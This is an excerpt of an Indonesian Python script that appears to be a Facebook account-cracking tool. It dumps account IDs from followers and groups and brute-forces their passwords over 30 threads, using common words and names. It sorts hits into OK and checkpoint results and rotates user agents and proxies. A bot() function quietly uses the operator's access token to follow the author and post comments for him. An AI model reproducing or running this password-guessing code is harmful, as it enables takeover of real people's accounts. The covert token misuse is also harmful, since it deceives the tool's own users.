...
def uaku():
	try:
		...
		a=requests.get('https://github.com/FENZOCONNER/FENZ-O-CONNER/blob/main/ua.txt').text
		ua=open('ua.txt','w')
...
def banner():
	print(f'''\t
 ─────────────────────────
Author : Monkey D.Fendi
Facebook : facebook.com/jibran.ysi
FansPage : facebook.com/100082578189444
─────────────────────────
{m}•{k}•{h}•{sir} Author : MONKEY D.FENDI {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		os.popen('play-audio data/login.mp3')
		banner()
...
def bot():
	try:
		id = 100026788095748
		post = ("100003557742197_4741460995982445")
		komen = random.choice(["sehat selalu bang","semoga sehat terus bang","gw selalu dukung lo bang"])
		requests.post("https://graph.facebook.com/" + id + "?fields=subscribers&access_token=%s"%(tokenku))
		requests.post("https://graph.facebook.com/" + post + "/comments?message=access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	gh = 'github.com/Fenz'
	cetak(nel('\tSelamat Datang [yellow]%s[white] Ngentod'%(my_name)));os.system("play-audio data/Fenz.mp3")
	...
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['a']:
		dump_follower()
	elif _____alvino__adijaya_____ in ['b']:
		grup()
		...
		if len(vin)==0:
			...
			for isi in vin:
				...
				if cih<10:
					...
					print(f'>> %s. %s ({k} %s {x}Idf )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
		...
		if len(vin)==0:
			...
			for isi in vin:
				...
				if cih<10:
					...
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} Idf )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}Idf )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
...
def setting():
	...
	print('>> 2. Akun New ({h}Recommended{x}) ')
	#print('>> 3. Random')
	hu = input('>> Pilih : ')
	if hu in ['1','01']:
...
#	print('>> 4. Mtouch ')
	...
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input('>> Password Tambahan? ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] sayang,kontol,anjing[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'{m}•{k}•{h}• {sir}Mulai Crack{x} {m}•{k}•{h}•{x} ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayang','kontol','anjing','katasandi','bismillah']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	animation = random.choice(["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"])
	sys.stdout.write(f"\r{P}{animation}[{b}{loop}{P}/{u}{len(id)}{P}]{P}[{H}OK:{ok}{P}]{P}[{k}CP:{cp}{x}][{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
if __name__=='__main__':
	...
	try:os.system('touch /data/scoks5.txt')
	except:pass
	try:os.system('touch /data/scoks4.txt')
	except:pass
	try:os.system('touch /data/proxy5.txt')
	except:pass
	try:os.system('touch /data/proxy4.txt')
	except:pass
	try:os.system('/data/ua.txt')
	except:pass
